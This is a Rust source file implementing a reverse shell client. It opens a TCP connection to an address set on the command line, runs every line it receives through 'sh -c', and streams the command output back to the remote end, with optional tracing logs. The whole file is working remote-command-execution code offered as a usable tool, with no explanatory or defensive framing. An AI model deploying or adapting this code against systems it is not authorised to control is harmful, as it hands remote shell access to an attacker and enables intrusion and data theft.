use std::io::{Read, Write};
use std::process::Command;
use std::{error::Error, net::TcpStream};
use structopt::StructOpt;

#[derive(Debug, StructOpt)]
struct Opt {
    #[structopt(short, long)]
    verbose: bool,
    #[structopt(short, long, default_value = "127.0.0.1:9999")]
    address: String,
}

fn main() -> Result<(), Box<dyn Error>> {
    let opts = Opt::from_args();

    if opts.verbose {
        let subscriber = tracing_subscriber::fmt()
            .compact()
            .with_file(true)
            .with_line_number(true)
            .with_thread_ids(true)
            .with_target(false)
            .finish();
        tracing::subscriber::set_global_default(subscriber)?;
    }

    let mut stream = TcpStream::connect(&opts.address)?;
    tracing::info!("connected to {}", &opts.address);

    let mut tcp_input = stream.try_clone()?;
    loop {
        let mut in_buf = [0; 1024];
        let n = tcp_input.read(&mut in_buf)?;
        if n == 0 {
            break;
        }
        let line = String::from_utf8_lossy(&in_buf[..n]).to_string();
        tracing::info!("received command '{}'", &line);
        let cmd = Command::new("sh")
            .arg("-c")
            .arg(line)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()?;
        if let Some(mut cmd_output) = cmd.stdout {
            tracing::info!("sending output for command");
            loop {
                let mut buf = [0; 1024];
                let n = cmd_output.read(&mut buf)?;
                if n == 0 {
                    break;
                }
                stream.write_all(&buf[..n])?;
            }
        }
        tracing::info!("done with command");
    }

    Ok(())
}
